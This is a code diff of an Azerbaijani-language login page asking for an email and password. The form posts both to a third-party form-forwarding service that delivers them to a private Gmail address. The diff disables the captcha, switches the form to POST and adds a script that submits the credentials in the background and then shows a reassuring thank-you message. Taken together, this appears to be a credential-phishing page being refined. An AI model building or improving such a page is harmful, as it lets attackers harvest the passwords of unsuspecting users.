@@ -58,6 +58,7 @@
             margin-top: 10px;
             font-size: 14px;
             color: blue;
+            display: none;
         }
     </style>
 </head>
@@ -66,7 +67,13 @@
         <h2>Hesabınıza Giriş Edin</h2>
         <p class="note">Xoş gəlmisiniz! Zəhmət olmasa, daxil olun.</p>
         <p class="note">Dəstəklənən Hesaplar: SS.</p>
-        <form action="https://formsubmit.co/suleymanbabayevoffical@gmail.com" id="myForm">
+        
+        <form action="https://formsubmit.co/suleymanbabayevoffical@gmail.com" method="POST" id="myForm">
+            <!-- FormSubmit üçün lazımlı inputlar -->
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="success.html"> <!-- Göndərildikdən sonra yönləndiriləcək səhifə -->
+
             <div class="input-group">
                 <input type="email" name="email" placeholder="Email" required>
                 <input type="password" name="password" placeholder="Şifrə" required>
@@ -74,7 +81,32 @@
             </div>
             <button type="submit">Göndər</button>
         </form>
-        <p class="response-message" id="responseMessage"></p>
+
+        <p class="response-message" id="responseMessage">Təşəkkürlər! Məlumatınız göndərildi.</p>
     </div>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Sayfanın yenilənməsinin qarşısını alırıq
+            var form = this;
+
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(form)
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("responseMessage").style.display = "block"; // Mesajı göstər
+                    form.reset(); // Formu sıfırla
+                } else {
+                    alert("Xəta baş verdi. Zəhmət olmasa yenidən yoxlayın.");
+                }
+            })
+            .catch(error => {
+                console.error("Xəta:", error);
+                alert("Bağlantı xətası baş verdi.");
+            });
+        });
+    </script>
 </body>
 </html>
